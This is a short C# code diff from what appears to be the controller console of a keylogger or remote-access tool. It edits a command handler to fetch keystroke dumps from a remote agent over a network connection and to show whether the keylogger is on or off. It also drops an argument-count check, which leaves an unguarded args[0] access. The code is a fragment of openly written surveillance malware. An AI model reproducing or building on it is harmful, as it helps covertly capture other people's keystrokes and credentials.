@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using Master.AdvancedConsole;
 using Master.Commands.Core;
 
 namespace Master.Commands
@@ -23,14 +24,20 @@ namespace Master.Commands
 
         public void Process(List<string> args)
         {
-            if (args.Count != 1)
-            {
-                return;
-            }
+            var result = MasterCommandsManager.networkManager.ReadLine();
 
-            if (args[0] == "status" || args[0] == "dump")
+            if (args[0] == "dump")
             {
-                Console.WriteLine(MasterCommandsManager.networkManager.ReadLine());
+                if(result != "") Console.WriteLine(result);
+            }
+            else
+            {
+                Console.Write("Keylogger status : [");
+                if(result == "on")
+                    ColorTools.WriteInlineMessage("ON", ConsoleColor.Cyan);
+                else
+                    ColorTools.WriteInlineMessage("OFF", ConsoleColor.Red);
+                Console.WriteLine("]");
             }
         }
     }
